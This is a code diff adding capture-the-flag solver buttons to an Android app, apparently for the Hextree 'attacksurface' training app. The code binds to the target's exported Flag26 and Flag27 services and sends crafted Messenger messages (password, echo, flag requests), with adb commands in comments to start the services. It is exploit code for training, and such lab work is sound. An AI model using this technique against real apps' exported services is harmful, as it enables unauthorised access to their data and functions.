@@ -4,16 +4,21 @@ import android.Manifest;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.ServiceConnection;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.os.IBinder;
 import android.os.Looper;
+import android.os.Message;
+import android.os.Messenger;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
@@ -466,6 +471,91 @@ public class MainHextreeSolverActivity extends AppCompatActivity {
                 app.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.MainActivity");
                 app.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(app);
+            }
+        });
+
+        //Flag26Activity
+        Button f26 = findViewById(R.id.f26);
+        f26.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag26Solver", "Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
+                intent.setAction("io.hextree.services.START_FLAG26_SERVICE");
+                startService(intent); //  if this doesnt work start it via adb:
+                //adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag26Service
+                bindService(intent, new ServiceConnection() {
+                    @Override
+                    public void onServiceConnected(ComponentName name, IBinder service) {
+                        Log.v("Flag26Solver", "Service connected");
+                        Messenger messenger = new Messenger(service);
+                        Message msg = Message.obtain(null,42);
+                        try {
+                            messenger.send(msg);
+                        }catch (Exception e){
+                            e.printStackTrace();
+                        }
+
+                    }
+                    @Override
+                    public void onServiceDisconnected(ComponentName name) {
+                        Log.v("Flag26Solver", "Service disconnected");
+                    }
+                }, Context.BIND_AUTO_CREATE);
+            }
+        });
+
+        //Flag27Activity
+        Button f27 = findViewById(R.id.f27);
+        f27.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Log.v("Flag27Solver", "Button Clicked");
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
+                startService(intent); //  if this doesnt work start it via adb:
+                //adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag27Service
+                bindService(intent,new ServiceConnection() {
+                    @Override
+                    public void onServiceConnected(ComponentName name, IBinder service) {
+                        Log.v("Flag27Solver", "Service connected");
+                        Flag27ServiceInteractor f27SI = new Flag27ServiceInteractor();
+                        Messenger messenger = new Messenger(service);
+                        // 1. get Password
+                        Message msg1 = f27SI.getGetPasswordMessage();
+                        try {
+                            Log.v("Flag27Solver", "Sending getPasswordMessage");
+                            messenger.send(msg1);
+                        }catch (Exception e){
+                            e.printStackTrace();
+                        }
+                        // 2. set echo
+                        Message msg2 = f27SI.getSetEchoMessage();
+                        try {
+                            Log.v("Flag27Solver", "Sending setEchoMessage");
+                            messenger.send(msg2);
+                        }catch (Exception e){
+                            e.printStackTrace();
+                        }
+                        v.postDelayed(() -> {
+                            // 3. get Flag
+                            Message msg3 = f27SI.getGetFlagMessage();
+                            try {
+                                Log.v("Flag27Solver", "Sending getFlagMessage");
+                                messenger.send(msg3);
+                            }catch (Exception e){
+                                e.printStackTrace();
+                            }
+                        }, 5000);
+                    }
+                    @Override
+                    public void onServiceDisconnected(ComponentName name) {
+                        Log.v("Flag27Solver", "Service disconnected");
+                    }
+                }, Context.BIND_AUTO_CREATE);
+
+
             }
         });
     }
